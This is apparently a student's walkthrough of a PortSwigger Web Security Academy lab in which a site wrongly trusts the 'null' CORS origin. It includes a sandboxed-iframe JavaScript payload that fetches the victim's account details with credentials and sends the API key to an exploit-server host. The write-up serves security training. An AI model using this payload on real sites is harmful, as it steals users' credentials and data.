https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

THIS BECAUSE THE WHITELIST IS NOT WELL CONFIGURED


1) on /accountDetails request we can see that there is Access-Control-Allow-Credentials: true so it uses CORS


2) try to insert in the request Origin: test.com and see that in the response we obtain Access-Control-Allow-Origin: test.com
    it doesn't work 

    but if we try null it works

    so it easily reflect the origin "null" and for this reason is vulnerable to CORS vulnerability

3) if we force another user to perform a request to /accountDetails we can steal the information of this user 
    by the fact that the CORS is misconfigured then we can use the exploit that performs this request when the user visit our malicious page
here the server allows the using of null origin and sends response to it



to use null origin we can use <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc=" and in it the script

<html>

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
fetch('https://***********LAB-ID*************.web-security-academy.net/accountDetails', 
    {
    //without it the victim cannot send the data, so will not obtain it in return
    credentials: 'include',
    })
  .then(response => {
    return response.json();
  })
  .then(data => {
         console.log(data);
          fetch('https://exploit-*************EX-ID*********.exploit-server.net/?apikey='+data.apikey)
  })
</script>">
</iframe>
</html>
